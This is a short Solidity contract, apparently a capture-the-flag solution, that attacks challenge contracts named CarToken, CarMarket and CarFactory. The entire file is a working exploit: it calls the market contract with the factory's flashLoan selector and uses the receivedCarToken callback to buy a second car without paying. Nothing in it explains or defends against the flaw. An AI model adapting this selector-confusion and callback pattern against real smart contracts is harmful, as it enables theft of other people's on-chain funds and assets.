// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

import "./CarToken.sol";
import "./CarMarket.sol";
import "./CarFactory.sol";

contract HackCarMarket {
    CarToken carToken;
    CarMarket carMarket;
    CarFactory carFactory;

    constructor(
        address carTokenAddress,
        address carMarketAddress,
        address carFactoryAddress
    ) {
        carToken = CarToken(carTokenAddress);
        carMarket = CarMarket(carMarketAddress);
        carFactory = CarFactory(carFactoryAddress);
    }

    function hack() external {
        carToken.mint();
        carToken.approve(address(carMarket), 2 ether);
        carMarket.purchaseCar("1", "1", "1");

        uint256 balance = carToken.balanceOf(address(carMarket));
        (bool success, ) = address(carMarket).call(
            abi.encodeWithSelector(CarFactory.flashLoan.selector, balance)
        );
        require(success);
    }

    function receivedCarToken(address) external {
        carMarket.purchaseCar("2", "2", "2");
    }
}
